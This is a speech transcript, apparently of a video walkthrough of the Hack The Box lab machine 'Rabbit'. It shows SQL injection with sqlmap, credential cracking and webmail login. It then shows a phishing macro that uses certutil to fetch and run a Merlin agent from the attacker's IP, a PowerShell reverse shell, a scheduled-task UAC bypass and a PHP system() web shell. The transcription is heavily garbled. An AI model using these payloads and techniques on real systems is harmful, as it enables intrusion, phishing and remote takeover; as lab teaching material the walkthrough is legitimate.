 what's going on YouTube this is if set can be doing rabbit from hack the box which had a lot of holes he could go down it was they had exchange installed which put OWA on it which is a webmail client smtp to send mail probably some pop stuff was listening also had Active Directory installed which put LDAP and DNS and then on top of that it had its own HTTP webserver installed that had Joomla and complain running PHP applications it just had a lot of things to enumerate so we'll kind of enumerate most of those things and show you when I stopped a nuvaring one thing and move on to the next and again always putting some type of recon in the background the actual path to this box was a SQL injection in complain that got you credentials to web mail from webmail you could see that defender was installed it had a PowerShell constrained mode and users were expecting to receive an Open Office document so you create a macro and OpenOffice document email it to them they execute the macro you get a shell and then to do all that we're gonna be using the CNC tool a command control tool Merlin we're not gonna use Metasploit or empire because I didn't want to use Metasploit because of the Windows Defender they say and I avoided using Empire because of the PowerShell restrictions they also said so Merlin is one written and go and it should bypass both of those so we'll do that and then from there you are a domain admin you have to bypass UAC you can either do it through a scheduled task or you could drop a file on the web server so that is the box so let's jump in and and map the box with - SC for default scripts as V enumerate versions Oh a output all formats put in the EM app directory and call this rabbit and the IP address which is 1010 1071 this does take some time so I've already and ran it and going over the results we have quite a few ports open so there is a large attack surface on this box the very first thing we see is Microsoft Exchange SMTP D on port 25 and because it is a mail sending protocol it normally sends the hostname so useful for like anti-spam dekum and stuff since we know the host name this box let's just go ahead and add this to our host file it's not often that you're required DNS to do some things but it's always one of those nice to have things so we don't have to remember the IP address so I'm gonna do rabbit rabbit hdbo cool it'll also do htb local as well so all three of those names will resolve to 1010 1071 because I just hard coded it on my box next port open is DNS and that is a Microsoft DNS server 70601 so this is probably gonna be I want to say that's 2012 I'm not positive but we could always Google that we'll just keep going through this but DNS is open and I guess we can poke around at DNS to see if there's any internal IP addresses assigned to this of course there is because this is hack the box everything is internal it's not like an external thing but to do that I just nslookup say the server is 1010 1071 which is rabbit and then we can do things like query hey do you know who rabbit is and the server's not responding so it doesn't have the reverse lookup for that I control seed to speed it up server 1010 1071 we can do rabbit HT be local which is its fully qualified domain name and we get back a ipv6 address so I'm always going to take this and let's just quickly and map ipv6 while we're going over the other thing so and map - 6 and rocking away with scripts or any of that nonsense Oh came back quick so it's looking at a quick glance like everything is the same 2553 80 39 4 4 3 4 4 5 so I don't see 3 3 8 9 which is one I'd look for especially when there's a firewall that's Remote Desktop so one of the things I do with DNS just try to find any other IPS on the box I don't know about if it's dual honed whatnot we have port 80 open so we're going to be doing a go Buster obviously on this then there's 135 which is a Microsoft from a procedural call 389 LDAP so this is looking more and more like a domain controller as well because not many Windows servers open LDAP other than Active Directory 443 is open that is iis and again we have the host name set in the certificate so definitely know this is rabbit doc eh to be done local it's the same thing SMTP said it is I is 7/5 then we have 4 4 5 open which is Samba so we can do things like PS exec most likely SMTP on port 587 this is the I think encrypted version believe a bunch of other ports 593 636 encrypted LDAP my sequel 1 3 3 or 6 that is interesting 8080 another web server and that looks about it so let us access all the HTTP pages so again good a rabbit then HTTP rabbit oh because I didn't put any qualifiers it automatically googled rabbit so HTTP colon slash slash rabbit 403 go here get I is 7 so we know there's something different between port 80 and port 443 so we have to check both of them out and then let's also check rabbit on 8080 and we get a picture look at the source code example nothing else so we have three different things we have to run a go Buster on to find let's just open up a new tab in terminal and then create the panes that we want let's do go Buster - H and we're going to specify the URL which is HTTP 10 1071 the wordless user share word list go Buster I was blanking for a second and then directory list will try to three small because we have to do three different ones so I'm just gonna do the small list and then we do - oh for outfile I believe or I think it's - they'll go string to write out yep so we do go Buster dot 80 go Buster dot small dot eighty so we know what we're list and what port we'd ran it against then let's run this again with - OH go Buster dot small dot four four three do HTTP we have to specify - K - ignore SSL certificate and then the final one will be port 8080 so - oh go Buster dot small 8080 so we get / public slash exchange if we go to those let's see what happens on four four three slash public and we get redirected to Outlook Web App and this is 2010 exchange so let us see if we can enumerate users real quick so I'm gonna go into MSD be run and there's like MSF console but got milk pointed out doing this automatically starts Postgres for you and then starts Metasploit so it's a bit handy I've always been using that since then and what I'm gonna try to do is set up some type of script to enumerate valid user names because I guess maybe timing attack JavaScript or something that gets returned from Outlook logins lets you know if a user exists or not so we're gonna search and then we can do OWA I think Oh W a login so if we use this show options and we have OWA version 2013 which is supported so maybe we can do show targets ah crap I forget how to do this I don't think this script actually supports the OWA 2010 so this would just be something to test on newer things so we sent username to administrator set username administrator set our host to be 1010 1071 /o w eh I wonder if it wanted the IP and there's a URL somewhere actually I think W way is a standard thing and that's what it wanted storing a DNS woke up and that's why I took forever to fail so yeah I think it just once 1010 1071 there and we can set V hose to be rabbit HT be local and I think if we just run this it's gonna try out wall again expecting OWA 2013 so it's not gonna find if it's a valid user or not unfortunately well that's going we can look at go Buster we have index favicon index and all caps Joomla and complain so we got a few other things to look a connection timeout to 1010 1071 that is odd is there a SSL thing brute force password proxy top one success so true yes stop on success now that should have done something different well unset V host run found domain HT be so set password test okay so failed login but username is valid HT b / administrator so let's set this name to something that isn't valid so we set this to that definitely not valid and run failed but username is valid and that's because this script is expecting OWA 2013 instead of 2010 which is installed I believe so if we locate this and we can see if there's any other targets if there is we can google around Metasploit to figure out how to do that you can search for 2013 I guess in the script module test credentials on 2003 7 10 2013 huh set actions wonder if there's a way to set the target I was really hoping that it wasn't and didn't really look into this that much show options so I could have done show targets set action to be OWA 2010 infill show options maybe this will work run but use name is valid set user name definitely not valid set V host rabbit htb dot local run so it looks like this script isn't working set action let's see what was another one we could set it to we just set 2010 so we can try 2007 so it's always detecting the username is valid so something is wrong there when it end that rabbit hole and come back to W way because we want to check the other things and a lot of time there's user enumeration things may work or may not results may vary but it's something you should check because it's nice to have things running in the background so let's check out Joomla so if we go to rabbit 8080 Joomla then close out these tabs down the rabbit hole we don't see any posts or anything I'm gonna check administrator manifests then I can go to files Joomla XML I see this as Joomla version three eight one Google this for release notes to see when Joomla three one got released October 4th 2007 teen which is probably around the time this box got launched so as an up-to-date Joomla Joomla three eight one exploit and these are probably all plugins so it's really hard to find vulnerabilities by just that's my email sorry about that find vulnerabilities and popular CMS systems by just specifying a version number so we can just do Jim Jim both core exploit and then see what's been around so four three three privilege escalation so this is going to require a account most likely and I wasn't aware of any Joomla things after three eight one and let's see Senta kated yeah attacker needs to be authenticated the joomla back-end with manager account so this isn't even just a user account this is a manager account exploit so i stopped looking right into joomla after that because i just want to see what was on complaint so just being software up-to-date not saying content in the site was enough to scare me away so we can do a complaint was they complain maybe not complaint there we go and we get this complain management system and we see it's powered by teksu a zoo of technology going to this site I think it's actually valid there is a another thing we can do and that is search boy complain and this is going to check exploit DB to see if there's anything known and it looks like we do have some sequel injections and going to tech zoo does I guess I don't want to be at the site with all these ads I have no idea what's gonna be on that site and it looked like they had bad ads that I didn't feel like putting on YouTube video so not gonna dig more into that looks like very crappy software and we'll leave it at that first thing is wine sequel injection so I'm not gonna look at that and it's also saying hard-coded credentials so no I'm actually gonna look at this because I want to know what the default as hard-coded credentials so we do search point - X paste that it looks like username administrator user type admin and password one-two-three-four admin one two three so we're gonna try that username administrator password admin one two three user type administrator and login you would not in a min so put junk in see if we get that same error message we do so I thought maybe the administrator account existed just got downgraded to a different user but looks like that's displayed on failure so let's see it looks like this is doing something that is authenticated admin view so let's see if we can register account here so register and once we do we're gonna see if we have access to this page if we do then we can try the sequel injection so user name is going to be epic password is going to be password count type should be customer that's fine please subscribe Lane and we'll do one two three four our address mobile number five 5 5 8 6 7-5 309 and we'll do email at subs at thanks comm I guess register looks like we did register will say never meant for this site if sec password was password and change your user type to employee and login if sec password i think i fat-fingered typing password so I'm pretty sure we should be able to well again register let's go please sub password I'm gonna type password and copy that in here 1 2 3 5 5 go do 5 by 5 8 6 7-5 3 or 9 and 1 at be calm for an email ok I still my password copied register please sub paste my password in I think I did an employee last time that's weird that it goes administrative customer employee I think hit down three times maybe that was the issue and we get logged right in so let us try going to this page so copy this paste this and we can see something so let's put a single tick in and try to validate the SQL injection and we actually get a error message so let's do - - based - - comment everything else out and we're still getting an error message which is odd we zoom in a little bit you maybe will see it's escaping or a single quotes so let's just try - - paste - to see what happens and doesn't error L let's put junk here that should error it doesn't if we put something before plants it says the table table plans that doesn't exist and the database complain so we know we have sequel injection here the downside is it is doing some type of escaping of quotes and if we try to double quote we see escapes that as well so let's just do our Union injection so single quote space Union select one we just have to know how many fields go into a union so let's do oh we have to comment at the end and we don't want this single tick so they try to stop SQL injection by escaping dangerous characters the downside is the statement looks like select star from table where query is equal to plan that's where it looks like generally you have where query is equal to that and that's why when you inject a single quote you have to do the comment to get the other single quote out because you want to terminate the sequel injection looking into this field because they encapsulated in quotes so if you didn't put a single court there you just be going into that same argument but because there's no quotes around what they're searching for you can just add a space and then you hop into the next argument if that makes sense hopefully it does so we're just doing plans Union select one we don't have any output let's do two no output three no output for nothing and we should be getting something oh there we go so this was silent error messages actually we don't have any error message it's not displaying anything but as soon as we hit five the valid amount for a union everything shows up and we see two three four five this is a new row so if we put like AAA and this that's going to error out because of the quotes being escaped so we can do like concat well we don't have to use concat we can just do like 0 x 4 1 4 1 4 1 4 1 4 a's and then we see we injected here so if you go to any other sequel injection video I'll try to remember put stuff in comments but like Karen and stuff like this you'll be able to take it from here and do it all manually you'd want to go to like the information schema table extract all the databases columns table names etc and do a bunch of that type of stuff one of the videos we actually create a Python module I think to do all that but I'll try to link those a little bit strapped to time right now so we're just going to do the easier route and send this into burp Metasploit so we're going to do intercept on then we just want to go to a clean page and we have to turn a browser to go to burp refresh then we can copy this to file and then we want to do report dot request or save it as report dot request save my file existed you just probably won't but create that request then we can do my sequel - R to load the request and we want to specify what did I just literally call that 5 seconds go report report - not my sequel SQL map that's my tab autocomplete wasn't working there we go and then let's do - - technique equals you from Union injection we know that's Union injectable what else do you want to do DBMS my sequel probably and I think that should be fun good probably done like - - batch the technique I think it's be EA UST let's see SQL map - H techniques be a b EU st q um boolean encapsulated union stacked time blind maybe forget what it is i think this is actually asked me for input right now yeah Anna whatever default was I forget what that is I think that it was right what I just said let's see well that's running intercept off SQL map de UST Q I don't know what Q is disabled let's see this is gonna say what each one is aa boolean that's encapsulated for e error here are so obvious boolean Air Union stacked time is T and query in line I don't know what that means exactly I think it's a type of stacked query honestly well maybe it's like whatever comes after a semicolon I don't think it's too common but you do more research on those that's all the types of SQL injection if you know what it is beforehand specifying it manually helps out tremendously so we do have it Union Jekyll so the first thing I'm going to do is a dash dash dump to dump everything and we'll see what's in this database so we have username email stuff that looks like just people making complaints my machines making noise office not working unable to connect so complaints right there that tables not too interesting customers we have us I didn't fat finger that I know now but um I'm guessing it was just again that login page and went administrator a customer employee and I was probably trying to login under employee because I was like oh I'm just gonna go to the very bottom field because I assumed there's some type of order when it assumed its ordered by privilege level not alphabetical plans engineers I don't really see any passwords there so we didn't really get anything from that but there was a joomla site on this same port so let's do - - DBS to list all the databases and we can see the Joomla database there's the my sequel database information schema that has all the information about my sequel secret is new I don't know what that one is so let's do - D Joomla - trash dump I'm getting all the information for this and if we go into a new tab root my sequel not my sequel sequel dump output rabbit dumb Joomla and this is generally how I view things we got assets categories types and extensions we actually don't have anything with like passwords get by passwords store hash so generally get anything out of Joomla so I may have not had permission to a lot of the tables but let's do that secret database that it had so if we do - deed Joomla or - D secret see it wants to crack passwords sure we'll do yes default dictionary and see if it gets anything so we got Barcelona for user Malik popcorn for Dhamma Pussycat Dolls for Ariel Santiago for someone so let us oh I forgot I had the hope here that go up here and let's put all these in a file so V creds will do Malik Barcelona Duma popcorn Ariel pussycat dolls mobius maybe for Santiago and let's try that um Metasploit thing again see if that thing works I'm s DB run database it started so it's not going to start it and this has a user pass file that's why put them both in the same thing so let's see search OWA let's do Oh W a login use show options set action OWA 2010 our host let's see try using this password use a file use a pass file so file containing users and passwords separated by a space one per line that sounds like what we did so user pass file creds run and we didn't get anything oh yeah the domain is HTTP probably because it's rabbit htb dot local see they login for every one set action oh do let's do show options set action OWA 2013 so we got one fat login actually so maybe this is odigo a 2013 not 2010 maybe I'm wrong there but we do have a successful login so we know Ariel is Pussycat Dolls so let's go over to the OWA page which was HTTP rabbit OWA and we want to login with Ariel and Pussycat Dolls and we have a few emails so we see there's been a change in loud software help desks move to everyone to open office has deployed Windows Defender and PowerShell constrained mode as the default organization security standard so when I know they do some type of PowerShell protection and this is gonna be easily bypassed with just specifying PowerShell version 2 because all the PowerShell versions PowerShell protections are in version 5 so if you downgrade PowerShell by doing - v-space - you bypass all those PowerShell version 2 is now uninstalled by default I believe so that doesn't work but when I see them doing stuff with PowerShell I generally revert to not using PowerShell because it's so easy to catch people if you have powershot logging on and they use PowerShell so and then we have the mask and ascend TPS reports to management so we know the user open office what defenses they have and they're expecting TPS reports probably in an OpenOffice format so what I'm going to do is reply this email see who is on it we got administrator a cane and Magus if we just do check names it doesn't look like that's working attached that's not working let's try signing out so we can switch to that light mode so use light version of Outlook Ariel I think Pussycat Dolls is doing my clipboard it was so now let go back to the Czech names does this load this is a pop up a pop under attach oh it's doing stuff to the fricken right and now that's not working okay when we redo this it should be easy so most recent recipients we got Raziel Magus Kane administrator Ariel Kane it's not adding them all that's annoying so let's do it Ariel send to myself just to make sure it works Kane wasn't doing multiple people Kane Raziel okay I'm switching to Chrome let's see chrome no sandbox stuff you should never do should just switch to the user and do it but I don't have it set up to do that yet because I reinstalled everything sure chromium okay now let's try this again maybe this will be better rabbit erielle Pussycat Dolls it's always important to have more than one browser because some things tend to not like some browsers and old versions of OWA are notorious for that check names let's try ariel cane there we go Magus Raziel so now I can add everyone TPS report oh we have to create a fishing document so let us also open up OpenOffice and you can just install LibreOffice I got that off of apt and after we generate the macro we're also going to have to create a payload I'm going to use Merlin I'm not going to use Metasploit because they have defender I'm not gonna use Empire right away because they have some type of PowerShell all game so my initial foothold is gonna be Merlin and once I do that I may do a reverse shell with PowerShell and do things like that but my initial foothold won't be PowerShell because I want to know I want to take as many variables that would stop it from working out of the equation and if I went with PowerShell and just try the - v2 and they didn't have PowerShell version 2 installed then I could be getting a false negative where the exploit worked but I didn't get a shell because of something I didn't take account for so I know Merlin probably will almost always work because it's relatively new defender won't pick it up and it's not PowerShell it produces binaries so all that being said let us go into creating it so if we go to tools macros edit macros standard file new how do I do this select macro here untitled that's my document ok new module name module one sure won't take this out of main and put on load and then we can probably just do shell CMD /c and in order to get a binary without a binary on the machine without using PowerShell I'm going to use suit you till we do - URL cache - split F and now we want to specify the file so HTTP 10 1014 - please subscribe dot exe and we'll put that in C colon temp we'll say thanks for subscribing and then we want to execute it thanks dot exe okay so upon opening the document it's gonna run this matte grill so we can save we'll save this as EPS echo DT closeout closeout and now we have to generate everything so we can get rid of this SQL if we go to opt Merlin this is a go thing and I'm gonna do a little bit of cleanup because I probably used Merlin so let's see well an agent let's remove the executable let's go into Merlin server data server okay oh I don't have a dot package okay so let's see bead bash on history profile is that way specified much always specified my go path so let's just go into go make the back and be star back okay the reason why I was doing that is because I want to show going to get all the modules and doing all that stuff because I've used Merlin before so there's no scent for me since I've used it before so the very first thing to do is download Merlin make sure you have go and for this video I just type go version I'm using go one dot 10.3 so the very first thing to do is we have to try to compile Merlin so if we go into CMD Merlin agent and then do go build it's gonna come with a few errors so we can't find the package so I'm gonna go get this package and goes repository manager is github so get the packages they're not that one now we do go build we have an agent the downside is the agent is a 64-bit elf executable which isn't gonna work on Windows because this is a Linux binary go compiles for pretty much anything so we can just do go OS is equal to I think it's when maybe Windows and then I think go arc is equal to MD 64 and then go build is it windows there we go and now we do Merlin Agent exe we see it is a PE 32 a Windows thing and it's 64-bit so that is cross compiling and go which is one of the main reasons I like it because it makes it so easy the other thing I probably forgot to clean up that I didn't do is if you go in a main go I have hard-coded my IP into this binary there is a flag you can do with an argument so you can call like Merlin agent DXE I think - a or something - you for the URL and specify it but just Mike hard coding it into the binary because I hate passing agents because I'm a pastor argument wrong and then again you get that false negative of where you executed code but because it didn't accept the argument you didn't get a response and you assumed it was a fail so build this we also have to build the server so go into Merlin server and this one gets a little bit tricky because we're gonna have to do as a sell stuff do dot slash Merlin and once SSL certs so what I'm gonna do is move Merlin server up to directories and I'm gonna wipe out what's in my data because I probably my SSL cert yeah x.509 yep so clear out the cert oh we can do that and now we're going to generate a SSL cert because Merlin uses HTTP 2.0 as its communication stream so in order for it to do SSL we have to Janice it so we're going to use open SSL then rec x.509 new key RSA 4096 sha-256 key out is going to be server key the out file is going to be server dot cert subject is going to be CN for common name I will do it set calm and - Caze we can do anything we want I'm going to do seven days mister it's gonna be valid for seven days normally you do your engagement time for how long you sir it is valid for maybe you add a week so you have extra time to run a kill all command but hopefully your agents automatically kill themselves after a certain amount of time and as I was talking I made a lot of typos that was fixed let's see I think that's good it's gonna generate the key and now we should be able to run Merlin server there we go the downside right now is it's listening on one twenty seven zero zero one four four three so let's do merlin server - i for P or interphase 10 10 14 - I hope that's might be I wrote that in the macro yep that is so we got the agent running let's rename this to Merlin and then we can exit Metasploit we want to go into its Merlin and let's generate a Linux copy as well so I'm just gonna do go build I'm doing this so I can test out to make sure everything's working so if I just execute Merlin agent I should get a callback here and then it's very much like Empire so you interact you can do info to see everything show options I think not options help so info list option list settings about your agent help get what you can do there's no modules in Merlin you just run commands so I can do CMD I have config that's going to test that agent to do and if config and report back and the default check-in time is 30 seconds so it can take a little bit of time but that is how Merlin works so we can do help kill this agent and we know at least everything looks fine so let's copy Merlin agent to be IDOT executable into root h-2b boxes rabbit and I want to make a directory yeah we'll copy it there go into that directory make the dub dub dub move that agent into dub dub dub and let's just name this was it please subscribe Exe we're gonna go back LibreOffice to ensure we save the macro correctly and the macro is not going to run correctly on a box it's a linux box and we're calling like CMD dot exe so obviously that won't work singing wanna load that maybe we'll just yellow it and nope there we go so let's do file open and then we want to go into huh where did I save that did I not save the file where's the default location save as root documents open this it contains a macro good to know edit macros EPS echo DT and it looks like everything's good CMB dot exe /c cert util download please subscribe to EXCI save it to c : temp thanks because you guys subscribe and know that and then Andy and if successful run the program so I think everything is good so let's go back to Chrome not Firefox we can go to the drafts a TPS report attach choose a file go into documents hip sac attach this done as requested and then send and now the waiting game comes actually Python M simple HTTP server 80 I'll call this HTTP server chromium that's fine see we don't really have anything else in go Buster OWA huh even on HTTP slash OWA redirected you to probably the SSL version I just did ctrl L there to clear but it can take some time for the macro to execute so I'm gonna pause the video and hopefully we get a hit it took about six minutes but we did get actually two hits and we'll go over to the Merlin tab but only one agent check in so it's a bit odd that it hit us twice but it only executed one so I'm guessing the payload just ran once we do interact with III whatever we can do CMD who am I actually will do info help set sleep to b5 it's gonna take probably thirty seconds for it to check in and set that sleep to be five seconds let's see it is active agent wait time so I'm gonna see if this changes to five seconds still thirty and I don't use Merlin all that Alton so I think that was a correct command it looked right we'll see I will also issue a CMD Who am I and while that goes let us we can get out of chromium because we don't need that anymore and we can set up a reverse shells so let's go into dub-dub-dub and then copy opt nishang what is it shell then invoke powershell tcp ps1 and we can edit this and we're going to do the reverse shell but that end and we can do 10 10 14 - as our IP address 9001 as the actual she'll save this and then go back over to Merlin we did get a call back we are htb Raziel do info sleep is still set at 30 seconds so didn't take that command oh well we will do CMD powershell - v-space - then - exec bypass this is the bypass execution policy thing ix new object net web client download string HTTP 10 1014 to slash let's make this a bit easier to do we'll just call shell ps1 go to Merlin shell ps1 and that go to an HTTP server page start it and we do NC LLVM P 9001 and see if this executes so it should only take about 30 seconds for it to run and I think it says failure if not if we did something wrong but we're doing PowerShell - V space - to see if they have version to enable and this will bypass their constraint policy - exec just in case they have scripting require like script signing of things like that this is just the execution bypass thing and then put this in quotes oh it's all in one argument it does contain spaces which is the default delimiter to do or badness if we look at HTTP server we do have the she'll call back so it hitting the page and then us getting a shell so let's rename this to shells and then we probably should copy something like power up so opt power sploit I always love using the dev one then we can do what is it brave ask power up IX new object net web client download string we like doing single quotes here 10 10 14 to our up ps1 that looks good foul not found oh this is not in the dub-dub-dub directory so let's move power up there then we can copy this paste it again we loaded it and let's now use the new thing we have which is invoke all checks and that is in powerup itself if we just grab the beginning for a function on powerup or make that case insensitive we can see all the functions power up has and then that was a all check somewhere well probe ask audit is aliased to all checks scrap - i all check invoke all yeah alias so probe s called it is alias to invoke all checks so let's see user is in local group with administrative privileges it wants us to use this w script bypass unquoted service path we don't even have to do any of that because we're already admin we could by just write to those files access to a VMware path is denied so I'm also going to use a nother script called jaws so if we copy opt Jaws jaws II new here and then we can run that so I X new object net web client downloaded string 10 10 14 to slash jaws enum dot ps1 and if you just google github jaws windows and numeration you'll find this script easily so this one takes a while to run as soon as you load the script it executes I think all checks so jaws windows enumeration github this is it that's what I ran so I'm gonna pause the video let this run it'll probably be five minutes I'd guess it takes a while to run but it does a lot of cool stuff jaws is finished running so we can take a look auto log-in we have Raziel with these credentials so the very first thing I'm going to try to do is use in packet and I always like using the github version because it's a little bit newer like meta Sports right now is I think at let's see what are we were not one 918 Metis boys at one nine a wet 0 918 Metasploit not Metasploit Cali is at zero nine one five and one of the differences is SMB v3 so impact it is one of those scripts I like using the github version so we'll do h TB / Raziel I spell that correctly back to shells or AZ ie L okay and then we want to do at rabbit HT be local and paste to make sure the password was correct cmd.exe put the password connection reset so that didn't work we'll try W my exact try a few things it doesn't look like this will work was it when our M what's the other one we can do decom exact keep getting connection resets so maybe there's something going on with the firewall or something but doesn't look like this is working because if we go into users administrator or game permission denied we are an administrator but UAC is on the server so I may have neglected to mention that's what I was looking for I'm looking for a way to get out of UAC because power up if you're calling me saying a few minutes ago said I was a member of the local group and then I saw all the other error messages which told me UAC but I think I forgot to mention that as I was saying it but let's go up store credentials nothing cache files 10 last modified files I like how jaws specified user data tax is interesting I wonder if that's just because it's in desktop X Y Z dot link user link we got some weird shortcuts and recent documents so we know fine what that XYZ thing is unquoted service path it looks like someone did PS exactly right here that random dot exe those desktop program files so you can see jaws just displays a ton of information we see a bunch of things from 1024 2017 patches and I think that's around the time that Joomla thing said it was installed so the machine was fully up to date going up that is just installed programs let's see what do we have anything interesting security bunches of client packs Open Office I asked nothing too interesting services so I'm sure we'd find an interesting service here w amp my sequel that's running so we may be able to use my sequel to get system it's probably a few other things running there let's see it's a lot of services go through this show quick know we may come back to it we got a lot of enumeration and go through but I wonder what was on port 8080 cuz we huh we could probably write to IAS or port 80 whatever is listening on port 8080 and get a shell that way ice coming in on port 8080 because we know that runs Joomla Joomla speech P I'd rather use PHP than IAS because I freaking hate ASP so we'll probably go back and try to find where Joomla is stored and write a shell that way and see if it's running a system if it isn't running a system we'll have an interesting token the SE impersonation token and be able to escalate to admin through rotten potato or now juicy potato by I Dakota these are all scheduled tasks that I'm looking through now I was just talking as I was reading just slowly scrolling up see if there's anything non-standard and you can see how many scheduled tasks are in Windows nothing there come it's easy to miss things we have a task name here system maintenance running by Raziel cmd.exe test dot bat so it may be worth it here's someone using Oh No this is I thought it was Empire persistence but it's the scheduled tasks for him to download and execute the documents so we see it getting the attachment so there's a PowerShell script that logs in downloads all attachments and then it just executes s-- OD T's with PowerShell and that acts that works I guess PowerShell can person ODT file and execute that's weird but key one right here is we're doing cmd.exe on app data test bat and we can go there's a bunch of processes running here's where the net set output can tell us what's exactly running on 8080 but let's see will it get any type of looking through all this enumeration if you can't tell now put so much information two three six four so if we search for two three six four we see httpd so it's not running I is it's running httpd so that would give us an idea of where to place a file but did I copy XYZ correctly of course not I highlighted and deleted it that's why Z there we go so we want to modify this file see what this file is first so type file name it's just running PowerShell D is equal back slash temp we still have thanks exe so we can just let's copy that out I think there's a con that cleans that up so let's copy thanks dot exe de c : users public users public it is there so we can echo C colon backslash users public thanks to XE to that file if we execute that we see it's going to call that and it's a bat file with just this it should call thanks to XE which will give us a shell if we do info and Merlin we see just this one agent we interacted with it thinks it's dead because it hasn't called back because of a reverse shell so keep eye on that and while we wait for it let us see if we can drop a shell so we're would httpd right to lamp 64 is there a dub dub dub dub dub dub joomla so here we go so if we just echo PHP system what if I need quotes PHP system Quest oh shoot immediate that's why we're gonna type yep echo that failed so we need that single quote PHP system request there we go so let's do this I don't know why I only copied a subset I want to direct all that do please sub dot PHP and we have that file if we go to ten ten ten seventy one eighty eighty please sub PHP we don't get a 404 error and I know what I was going up I'm an idiot so this was supposed to be the variable name I don't know why I can't think straight right now and wasn't doing the PHP shell correctly but no I know what I need to do so do that then we want request here and we can put I'm a dummy here sometimes you just have those brain fruits and you don't think straight please sub dot PHP tight please sub dot PHP there we go and if we put this argument I'm a dummy equals Who am I we don't get anything maybe there's the one I have to echo oh no maybe it doesn't want the PHP thing some things get really picky about exactly how they process PHP and since I saw and the source there's no way it's executing because it's displaying PHP I don't think it wants that PHP at the beginning let's see type index old PHP now was this going that is a big index I have no clue what's going on there let's go to complain type view dot PHP it does PHP there I wonder if it's just like an executable permission bit I didn't set echo PHP do this on separate lines as well so two EPs x ph p then we can echo what do echo system request eps ACK that looks right and we can echo epic PHP so now when we view if sec dot PHP it looks pretty much like everything else and I think echo doesn't do a space but this will tell us at least it will give an error message nope still doesn't want to execute so missour one if we just do this in the script itself so echo this to repo dot PHP don't have write access dia - nee hip sack that looks right type app SEC dot PHP type me put PHP does PHP and ends tags it's exactly what I did why doesn't want to execute my PHP code Azura let's go back into Merlin do we have a show yet we do not um let's see X Y Z let's try starting that task manually and kicking it so if we have permission we should be able to run this task system based maintenance so if we do a copy here and it's what is it seh tasks /tn I think ready okay so now we have to run it which I had just forgot to do slash run /tn system maintenance attempted a run look at Merlin we should get a call back I wonder if Merlin's hung up because let's see Tam everything's going bad right now everything Merlin received a new agent I gotta kill that show now unfortunately go back to Merlin and interact for five da then we can do that CMD again and we should get the call back but you look at Merlin knows quick stole at 30 second wait time okay I thought it switched to the five seconds so let's go do that scheduled task so where was X Y Z X Y Z and I'm jumping back and forth too much I don't like it but the famous last words I should have prepared more and done this machine before recording the video I did this probably eight months ago or whenever it got released so let's just do echo CMD /t C colon backslash users public thanks exe maybe if we do it this way and we'll copy it to this test op bat and then schedule tasks /r on /tn system maintenance attempted to run that task Merlin agents help agent list do not have anything well if I'm specifying it wrong let's do SCH tasks run TN doesn't display anything let's see let´s do echo we can do suit you till then - you will URL cache split - f 10/10 what actually we'll just let go ping 10/10 14 - simple enough if this bat file executes it will ping us TCP dump - I tun zero ICMP run this and we're not getting a ping so we did something wrong with this and if we just execute this test I bet we'll see what happens CMD /c type so let's see that didn't work it just spawned a new command shell and now we exited interact for five CMD let's see if we get a shell I may have to do another agent back agent list because it says it's delayed so I don't know exactly what delayed means maybe it's just a wait on calling back yeah that's what it means okay so nothing's I'm sure what at scheduled tasks isn't working trying to think I guess let's try CMD / K and see if it works this way and if this doesn't work we're going to go back into the web stuff because I think I have an idea there opera program or a batch file maybe it doesn't like me echoing stuff in let's go see users Raziel app data local town XYZ okay so let's do IX new object net dot web client download file instead of string HTTP 1010 14 - we call this desktop bat and we'll place it in test dot bat try it this way and this will be V desktop bet C colon backslash users public thanks dot exe and will also hang 10 10 14 - okay oh I'm in PowerShell I probably need dot slash no this is scheduled tasks running never mind I'm idiot there let's see did I call that before I started the web server IX new object download file can we delete test up at now right this okay because it is null why do you say no IX new object net dot web client download file I wonder if some type of PowerShell restriction is hitting me here desktop that okay so let's try the cert util method we're definitely getting the file it's just not writing the file which is odd echo test to test yeah I can write files so I don't know why it's here right so so you till your L cache split f10 1014 to test up bat test up bat that save it saved scheduled tasks run task name system maintenance attempted to run so this time it definitely ran we did schedule tasks run system maintenance we got the ping and we get a caller back so it doesn't like echoing that is bizarre if we do CMD Who am I we'll probably get system so we can go back and I'm gonna try that PHP thing again shells CD back / CD way up 64 CD dub dub dub let's delete please sub PHP we can get out of this TCP dump we can V please sub PHP PHP system request Epps ACK you know what when I get color in my syntax I'm actually remembering how to type that a lot better maybe it's just like a subconscious thing of saying all-white that makes me forget that's like muscle memory is a maximum so we got please up here so let's do that cert utility magic again let's see so util please subscribe dot PHP and I'll say I bet Unicode sucks dot php' failed why'd you fail please subscribe plz sub if I can have a decent memory that would help dot PHP I bit that Unicode sucks PHP there we go now if we go to I bet Unicode sucks PHP that was like a PHP era yep so what I say if SEC equals Who am I anti-authority system so here we go machine is finally done it was something with frickin Unicode let's see d IRC : users administrator see if that works CMD dir C : users I think now this shell is bypassed UAC by that scheduled tasks so if this CMD this returns the contents of administrator I know it worked because if we were on the same command on our shell we'll get access denied access denied maybe one day that will return and this is definitely system because it's running as system so temp thanks dot exe got a new agent so you give this another 10 to 15 seconds see back agent list so we know this one is active and maybe that CMD failed interact if this CMD dir C : users administrator but you'll definitely know this is not going to be UAC because it is the system just trying to prove all this is annoying because of the 30 second wait for check-ins back interact 40d let's go back to shells exit Merlin Oh God oh that's because that agent checked in CMD PowerShell run that let's see yeah these are all my error messages trying to download file I wasn't listening when I ran that PowerShell command so now we go wait probably 30 seconds and we'll get this shell and this is the UAC bypassed one and then the next thing we'll do is the system shell so see that ran may be agents agent lists interact three five shells CD backslash c d users CD administrator and now we can go into this directory and we see route text is 32 characters and was still Raziel so we're no longer you a seed if we exit this listen on 9001 and we are 35 FF this is the anti-authority system 1 1 CMD again donut powershell maybe 1 in CMD /c we're getting executor di are not found in path so maybe CMD dr it just doesn't work but powershell this should give us a call back probably in 30 seconds since as i type that we got during executable not found so that missed a check-in info just wait here probably 20 seconds oh now now works do it's loading the show Who am I system and now we can go users administrator and do that so that is the Box I hope you guys enjoyed it sorry that whole snafu and near the end of it with all those things just not executing I was like I know I'm doing all these commands right I don't know what's going on but today I learned don't echo stuff into like a dot bat file and PHP and just magically expect it to work I'm guessing that works from like interactive shell but nishang probably changes it from like utf-16 little-endian to ascii or something I don't know I'd have to check exactly what encoding the file was but it's definitely something with file encoding why that didn't work so alright I'm 80% confident that's the reason anywho take care and I will see you next week